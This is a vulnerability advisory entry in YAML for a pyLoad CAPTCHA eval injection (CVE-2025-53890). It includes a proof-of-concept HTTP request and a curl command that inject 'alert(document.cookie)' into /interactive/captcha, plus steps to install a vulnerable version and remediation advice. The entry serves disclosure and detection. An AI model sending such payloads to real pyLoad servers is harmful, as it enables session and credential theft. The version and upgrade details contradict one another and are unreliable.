info:
  name: pyload-ng
  cve: CVE-2025-53890
  summary: pyLoad is vulnerable to XSS through insecure CAPTCHA processing, allowing unauthenticated remote attackers to execute arbitrary code.
  details: |
    The vulnerability lies in pyLoad's CAPTCHA processing code, specifically the `onCaptchaResult()` function, which directly uses `eval()` on attacker-controlled input without sanitization. This allows unauthenticated remote attackers to execute arbitrary JavaScript in the client browser, potentially leading to session hijacking, credential theft, and full system remote code execution if the environment supports it (e.g., NodeJS).
    
    The vulnerable code is located in `src/pyload/webui/app/static/js/captcha-interactive.user.js`.
    
    **Reproduction Methods:**
    1. **Official Source Installation**:
    ```bash
    git clone https://github.com/pyload/pyload
    cd pyload
    git checkout 0.4.20
    python -m pip install -e .
    pyload --userdir=/tmp/pyload
    ```
    2. **Virtual Environment**:
    ```bash
    python -m venv pyload-env
    source pyload-env/bin/activate
    pip install pyload==0.4.20
    pyload
    ```
    
    **CAPTCHA Endpoint Verification:**
    The vulnerable endpoint is `/interactive/captcha`.
    
    **Complete PoC Request:**
    ```http
    POST /interactive/captcha HTTP/1.1
    Host: localhost:8000
    Content-Type: application/x-www-form-urlencoded
    
    cid=123&response=1%3Balert(document.cookie)
    ```
    
    **Curl Command Correction:**
    ```bash
    curl -X POST "http://localhost:8000/interactive/captcha" \
      -d "cid=123&response=1%3Balert(document.cookie)"
    ```
  cvss: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
  severity: CRITICAL
  security_advise: |
    1. Upgrade pyLoad to version 0.20 or later.
    2. Implement proper input sanitization and validation for CAPTCHA results before processing them.
    3. Avoid using `eval()` with untrusted or user-controlled input.
  references:
    - https://github.com/pyload/pyload/security/advisories/GHSA-8w3f-4r8f-pf53
    - https://nvd.nist.gov/vuln/detail/CVE-2025-53890
    - https://github.com/pyload/pyload/pull/4586
    - https://github.com/pyload/pyload/commit/909e5c97885237530d1264cfceb5555870eb9546
    - https://github.com/pyload/pyload
    - https://cheatsheetseries.owasp.org/cheatsheets/JavaScript_Security_Cheat_Sheet.html#eval
rule: version < "0.20"